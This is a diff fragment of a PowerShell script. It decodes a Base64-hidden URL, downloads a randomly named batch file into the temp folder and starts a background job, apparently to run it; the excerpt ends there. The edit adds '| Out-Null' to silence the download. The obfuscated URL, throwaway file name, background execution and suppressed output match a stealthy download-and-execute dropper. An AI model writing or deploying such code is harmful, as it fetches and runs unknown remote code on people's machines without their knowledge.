@@ -3,7 +3,7 @@ $Url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String
 
 $OutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "djdyakht.bat")
 
-Invoke-WebRequest -Uri $Url -OutFile $OutputPath
+Invoke-WebRequest -Uri $Url -OutFile $OutputPath | Out-Null
 
 if (Test-Path $OutputPath) {
     Start-Job -ScriptBlock {
